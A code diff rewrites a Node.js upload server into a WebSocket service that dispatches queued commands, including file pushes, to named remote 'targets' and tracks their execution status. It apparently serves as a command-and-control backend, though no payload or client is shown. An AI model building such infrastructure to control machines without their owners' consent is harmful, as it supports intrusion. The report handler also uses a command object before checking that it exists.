@@ -1,63 +1,133 @@
 import express from "express";
+import { WebSocketServer } from "ws";
 import fs from "fs";
+import { v4 as uuidv4 } from "uuid";
 import path from "path";
 
 const app = express();
-app.use(express.json({ limit: "20mb" }));
+app.use(express.json({ limit: "50mb" })); // increase limit for file uploads
 
-const PORT = 3000;
-const ROOT = "./storage";
-const FILES = path.join(ROOT, "files");
-const META = path.join(ROOT, "meta");
+const PORT = process.env.PORT || 3000;
+const COMMAND_FILE = "./commands.json";
+const STORAGE = "./storage";
+fs.mkdirSync(STORAGE, { recursive: true });
 
-fs.mkdirSync(FILES, { recursive: true });
-fs.mkdirSync(META, { recursive: true });
+let targets = { targets: {} };
 
-/* ---------- RECEIVE CHUNKS ---------- */
-app.post("/upload/chunk", (req, res) => {
-  const { upload_id, rel_path, index, total, data } = req.body;
-  if (!upload_id || index == null || !data) return res.sendStatus(400);
-
-  const tempDir = path.join(ROOT, "tmp", upload_id);
-  fs.mkdirSync(tempDir, { recursive: true });
-  fs.writeFileSync(path.join(tempDir, index + ".part"), Buffer.from(data, "base64"));
-
-  if (fs.readdirSync(tempDir).length === total) {
-    const finalPath = path.join(FILES, rel_path);
-    fs.mkdirSync(path.dirname(finalPath), { recursive: true });
-
-    const ws = fs.createWriteStream(finalPath);
-    for (let i = 0; i < total; i++) {
-      ws.write(fs.readFileSync(path.join(tempDir, i + ".part")));
-    }
-    ws.end();
-
-    fs.rmSync(tempDir, { recursive: true, force: true });
+// Load existing commands.json
+try {
+  if (fs.existsSync(COMMAND_FILE)) {
+    targets = JSON.parse(fs.readFileSync(COMMAND_FILE));
   }
-  res.json({ ok: true });
-});
-
-/* ---------- BUILD FILE TREE ---------- */
-function buildTree(dir, base = dir) {
-  return fs.readdirSync(dir).map(name => {
-    const full = path.join(dir, name);
-    const rel = path.relative(base, full);
-    if (fs.statSync(full).isDirectory()) {
-      return { type: "dir", name, children: buildTree(full, base) };
-    }
-    return { type: "file", name, path: rel };
-  });
+} catch (err) {
+  console.error("Failed to read commands.json:", err);
 }
 
-app.get("/fs/tree", (_, res) => {
-  res.json(buildTree(FILES));
+function saveCommands() {
+  fs.writeFileSync(COMMAND_FILE, JSON.stringify(targets, null, 2));
+}
+
+// WebSocket server
+const wss = new WebSocketServer({ noServer: true });
+const clients = new Map(); // key: targetName, value: ws
+
+wss.on("connection", (ws, req) => {
+  let targetName = null;
+
+  ws.on("message", (message) => {
+    try {
+      const data = JSON.parse(message);
+
+      if (data.type === "register") {
+        targetName = data.name;
+        clients.set(targetName, ws);
+        console.log(`✅ Target connected: ${targetName}`);
+
+        // send all pending commands
+        if (targets.targets[targetName]) {
+          targets.targets[targetName].forEach(cmd => {
+            if (cmd.status === "pending") {
+              ws.send(JSON.stringify(cmd));
+            }
+          });
+        }
+        return;
+      }
+
+      if (data.type === "report" && targetName) {
+        const cmdId = data.id;
+        const status = data.status;
+        const cmd = targets.targets[targetName].find(c => c.id === cmdId);
+
+        // Handle file delivery
+        if (status === "executed" && cmd.type === "push_file" && cmd.value.local_path) {
+          // Move uploaded file to storage
+          const dest = path.join(STORAGE, path.basename(cmd.value.local_path));
+          fs.writeFileSync(dest, Buffer.from(cmd.value.content_b64, "base64"));
+        }
+
+        if (cmd) cmd.status = status;
+        saveCommands();
+        console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
+      }
+
+    } catch (err) {
+      console.error("Invalid message:", message);
+    }
+  });
+
+  ws.on("close", () => {
+    if (targetName) {
+      clients.delete(targetName);
+      console.log(`❌ Target disconnected: ${targetName}`);
+    }
+  });
 });
 
-/* ---------- DOWNLOAD FILE ---------- */
-app.get("/fs/file", (req, res) => {
-  const p = path.join(FILES, req.query.path);
-  if (!p.startsWith(path.resolve(FILES))) return res.sendStatus(403);
-  res.download(p);
+// HTTP routes for control
+app.post("/send", (req, res) => {
+  const { target, type, value } = req.body;
+  if (!target || !type) return res.status(400).send({ error: "Missing fields" });
+
+  if (!targets.targets[target]) targets.targets[target] = [];
+
+  const cmd = { id: uuidv4(), type, value: value || "", status: "pending", timestamp: Date.now() };
+  targets.targets[target].push(cmd);
+  saveCommands();
+
+  const ws = clients.get(target);
+  if (ws) ws.send(JSON.stringify(cmd));
+
+  res.send({ success: true, id: cmd.id });
 });
 
-app.listen(PORT, () => console.log("Server running on port", PORT));
+app.post("/cancel", (req, res) => {
+  const { target, id } = req.body;
+  if (!target || !id) return res.status(400).send({ error: "Missing fields" });
+
+  if (targets.targets[target]) {
+    const cmd = targets.targets[target].find(c => c.id === id);
+    if (cmd && cmd.status === "pending") {
+      cmd.status = "canceled";
+      saveCommands();
+      return res.send({ success: true });
+    }
+  }
+  res.send({ success: false, msg: "Command not found or already executed" });
+});
+
+app.get("/queue/:target", (req, res) => {
+  const t = req.params.target;
+  res.send(targets.targets[t] || []);
+});
+
+app.get("/status/:target", (req, res) => {
+  res.send({ online: clients.has(req.params.target) });
+});
+
+const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+server.on("upgrade", (req, socket, head) => {
+  wss.handleUpgrade(req, socket, head, (ws) => {
+    wss.emit("connection", ws, req);
+  });
+});
